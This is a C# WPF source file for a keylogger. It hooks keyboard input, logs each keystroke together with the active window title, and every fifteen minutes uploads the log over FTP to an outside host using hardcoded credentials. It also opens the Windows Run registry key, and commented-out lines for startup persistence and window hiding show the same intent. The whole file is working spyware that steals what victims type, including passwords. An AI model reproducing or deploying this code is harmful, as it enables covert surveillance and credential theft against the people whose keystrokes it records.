using System;
using System.Text;
using System.Windows;
using System.Runtime.InteropServices;
using System.Windows.Threading;
using System.Net;
using System.IO;
using Microsoft.Win32;

namespace Hook_Keyboard
{
    public partial class Window1 : Window
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetWindowTextLength(IntPtr hWnd);
        [DllImportAttribute("User32.dll")]
        public static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpbKeyState,
        byte[] lpChar, int uFlags);
        [DllImportAttribute("User32.dll")]
        public static extern int GetKeyboardState(byte[] pbKeyState);

        //[DllImport("user32.dll")]
        //public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        //[DllImport("user32.dll")]
        //static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private DispatcherTimer klok;
        string m_strLast = "";
        string m_strPrefix = "";
        LowLevelHook llhEngine = new LowLevelHook();
        private string ftptextl="";
        private string ftplink;

         RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        

        public Window1()
        {
            InitializeComponent();  
           // reg.SetValue("My app", System.Windows.Forms.Application.ExecutablePath.ToString());
            klok = new DispatcherTimer();
            klok.Interval = new TimeSpan(0, 15, 0);
            klok.Tick += klok_Tick;
            klok.Start();
            llhEngine.KeyDownChar += new LowLevelHook.KeyDownCharEventHandler(llhEngine_KeyDownChar);
            DateTime dt = DateTime.Now;
            string dateFormat = String.Format("{0:s}", dt);
            dateFormat = dateFormat.Replace(":", "_");
            dateFormat = dateFormat.Replace("/", "_");
            ftplink = "ftp://a5165772@flappy.herobo.com/public_html/" + System.Environment.MachineName+"_" + dateFormat + ".txt";
            //var hWnd = FindWindow(null, Console.Title);
            //if (hWnd != IntPtr.Zero)
            //{

                //Hide the window

                //ShowWindow(hWnd, 0); // 0 = SW_HIDE

            //}
        }
        void klok_Tick(object sender, EventArgs e)
        {
            System.Text.ASCIIEncoding encoding = new System.Text.ASCIIEncoding();
            Byte[] bytes = encoding.GetBytes(ftptextl);
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftplink);
            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.Credentials = new NetworkCredential("a5165772", "flappy1");
            Stream requestStream = request.GetRequestStream();
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            FtpWebResponse response = (FtpWebResponse)request.GetResponse();
            Console.WriteLine("Upload File Complete, status {0}", response.StatusDescription);
            response.Close();            
        }
        void llhEngine_KeyDownChar(uint vkCode, uint scancode)
        {
            IntPtr ipForegroundWindow = GetForegroundWindow();
            int nLength = GetWindowTextLength(ipForegroundWindow);
            StringBuilder sbTemp = new StringBuilder("", nLength + 1);
            m_strPrefix = "";
            GetWindowText(ipForegroundWindow, sbTemp, sbTemp.Capacity);
            if (m_strLast != sbTemp.ToString())
            {
                m_strLast = sbTemp.ToString();
                m_strPrefix = Environment.NewLine + m_strLast + Environment.NewLine;
            }

            ftptextl += m_strPrefix + ProcessInputKey(vkCode,scancode);
           
        }
        private string ProcessInputKey(uint vkCode, uint scancode)
        {
            char cTemp = GetAsciiCharacter(vkCode, scancode);
            if ( (int)cTemp != 0x0 && (int)cTemp != 0x8)
            {
                return cTemp.ToString();
            }
            else
            {
                return "[" + ((System.Windows.Forms.Keys)vkCode).ToString() + "]";
            }
        }
        public static char GetAsciiCharacter(uint uVirtKey, uint uScanCode)
        {
            byte[] lpKeyState = new byte[256];
            GetKeyboardState(lpKeyState);
            byte[] lpChar = new byte[2];
            if (ToAscii(uVirtKey, uScanCode, lpKeyState, lpChar, 0) == 1)
                return (char)lpChar[0];
            else
                return new char();
        }
        void vwWatcher_WindowsChanged(string strNewOwner)
        {           
           ftptextl += Environment.NewLine + strNewOwner + Environment.NewLine;            
        }
        private delegate void UpdateTextDel(string str);
        private void Window_Closed(object sender, EventArgs e)
        {

            llhEngine.Unhook();
            klok.Stop();
        }
    }
}
